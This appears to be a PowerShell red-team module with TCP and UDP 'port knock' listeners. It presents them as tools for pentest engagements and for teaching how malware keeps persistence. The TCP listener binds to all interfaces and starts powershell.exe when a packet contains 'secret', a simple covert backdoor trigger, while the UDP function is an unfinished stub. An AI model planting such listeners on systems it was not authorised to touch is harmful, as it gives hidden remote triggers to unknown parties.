<# 
.SYNOPSIS 
    Provides an interface for creating a TCP server that listens on a given local port.  This TCP server can listen to one or more port knocks from the client component of this module.  
    Designed for use during Windows Red Team and Pentesting engagements.
    It was also designed as an educational tool for understanding advanced persistance mechanisms used by threat actors and malware.

.AUTHOR
    Vasken Houdoverdov
    github.com/vhoudoverdov

.DESCRIPTION 
    Provides an interface for creating a TCP server that listens on a given local port.  This TCP server can listen to one or more port knocks from the client component of this module.  
    Designed for use during Windows Red Team and Pentesting engagements.
    It was also designed as an educational tool for understanding advanced persistance mechanisms used by threat actors and malware.


.EXAMPLE
    New-TcpServer -LocalPort 1337
#> 

Function New-TcpServer 
{
    Param ( 
        [Parameter(Mandatory=$True)]
        [int] $LocalPort)
        
        Try { 
            $LocalAddress = New-Object System.Net.IPEndPoint([IPAddress]::Any,$LocalPort) 
            $TcpListener = New-Object System.Net.Sockets.TcpListener($LocalAddress)
            $TcpListener.Start() 
            $TcpClient = $TcpListener.AcceptTcpClient() 
            $TcpListenerStream = $TcpClient.GetStream() 
            $BytesIn = [System.Byte[]]::CreateInstance([System.Byte],64)
            
            While ($($x = $TcpListenerStream.Read($BytesIn,0,$BytesIn.Length)) -ne 0)
            {
                $EncodedText = New-Object System.Text.ASCIIEncoding
                $TcpClient = $EncodedText.GetString($BytesIn,0, $x)

                # If the data passed as part of the port knock matches what we expect, we can begin running operations.
                if($TcpClient -match "secret")
                {
                    Start-Process powershell.exe
                }
            }

            $TcpListenerStream.Close()
            $TcpListener.Stop()
            }

        Catch {
            Write-Host $($_.Exception.Message)
              }
}

<# 
.SYNOPSIS 
    Provides an interface for creating a UDP server that listens on a given local port.  This UDP server can listen to one or more port knocks from the client component of this module.  
    Designed for use during Windows Red Team and Pentesting engagements.
    It was also designed as an educational tool for understanding advanced persistance mechanisms used by threat actors and malware.

.AUTHOR
    Vasken Houdoverdov
    github.com/vhoudoverdov

.DESCRIPTION 
    Provides an interface for creating a UDP server that listens on a given local port.  This UDP server can listen to one or more port knocks from the client component of this module.  
    Designed for use during Windows Red Team and Pentesting engagements.
    It was also designed as an educational tool for understanding advanced persistance mechanisms used by threat actors and malware.


.EXAMPLE
    New-UdpServer -LocalPort 1337
#> 

Function New-UdpServer 
{
    Param ( 
        [Parameter(Mandatory=$True)]
        [int] $LocalPort)
        
        $LocalAddress = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $LocalPort)
        Try {
        While($True) {
            $UdpClient = New-Object System.Net.Sockets.UdpClient $LocalPort
            $content = $UdpClient.Receive([Ref]$LocalAddress)
            $UdpClient.Close()
                     }
            }       
        Catch {
            Write-Host $($_.Exception.Message)
              }
}